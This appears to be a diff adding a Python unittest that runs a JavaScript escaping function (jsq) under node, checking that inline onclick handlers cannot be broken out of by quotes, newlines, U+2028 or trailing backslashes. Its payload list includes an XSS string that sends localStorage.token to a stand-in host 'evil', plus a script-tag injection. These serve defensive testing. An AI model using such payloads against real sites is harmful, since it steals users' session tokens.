@@ -12,7 +12,11 @@ JS 字符串照样被闭合。上游 `/v1/models` 返回一个模型名
 """
 from __future__ import annotations
 
+import os
 import re
+import shutil
+import subprocess
+import tempfile
 import unittest
 from pathlib import Path
 
@@ -54,6 +58,56 @@ class InlineHandlerEscapingTest(unittest.TestCase):
         body = source[source.index('function esc(s)'):]
         body = body[:body.index('\n}')]
         self.assertIn("&#39;", body)
+
+    @unittest.skipUnless(shutil.which("node"), "需要 node 才能真跑 jsq")
+    def test_jsq_output_cannot_break_out_of_a_string_literal(self):
+        """真跑 jsq：模拟「浏览器解码属性 → 编译 JS」两步，参数必须原样回传。
+
+        重点不是「转义了几个字符」，而是三种最容易漏的输入：换行、U+2028、
+        反斜杠结尾。换行/行分隔符在 JS 字符串字面量里是硬终止符——上游模型名
+        带一个换行就能让整个 onclick 变成语法错误（点了没反应），比 XSS 更隐蔽。
+        """
+        source = (UI / "app.js").read_text(encoding="utf-8", errors="replace")
+        start = source.index("function jsq(s) {")
+        fn = source[start:source.index("\n}", start) + 2]
+
+        script = fn + """
+const assert = require('node:assert/strict');
+assert.equal(jsq("a'b"), "a\\\\'b");
+assert.equal(jsq("a\\\\b"), "a\\\\\\\\b");
+assert.equal(jsq("a\\nb"), "a\\\\nb");
+assert.equal(jsq("a\\u2028b"), "a\\\\u2028b");
+
+// 浏览器先把属性值里的实体解码，再把结果当 JS 编译——两步都要模拟，
+// 否则测的就不是线上那条路径。解码后必须能编译成单个字符串字面量，
+// 且参数原样回到调用方。
+const decodeAttr = s => s.replace(/&quot;/g, '"').replace(/&lt;/g, '<')
+  .replace(/&gt;/g, '>').replace(/&amp;/g, '&');
+const payloads = [
+  "x');fetch('http://evil/'+localStorage.token)//",
+  'a\\nb', 'end\\\\', 'q\\u2029r', 'he said "hi"', "</script><img src=x>",
+  "换行\\r\\n与逗号, 还有括号()",
+];
+for (const payload of payloads) {
+  const attr = decodeAttr(jsq(payload));
+  let got;
+  const build = new Function('f', "f('" + attr + "')");
+  build(x => { got = x; });
+  assert.equal(got, payload, JSON.stringify({payload, attr}));
+}
+console.log('OK jsq');
+"""
+        with tempfile.NamedTemporaryFile("w", suffix=".cjs", delete=False,
+                                         encoding="utf-8") as fh:
+            fh.write(script)
+            path = fh.name
+        try:
+            proc = subprocess.run(["node", path], capture_output=True, text=True,
+                                  timeout=60)
+        finally:
+            os.unlink(path)
+        self.assertEqual(proc.returncode, 0, proc.stderr[-800:])
+        self.assertIn("OK jsq", proc.stdout)
 
 
 if __name__ == "__main__":
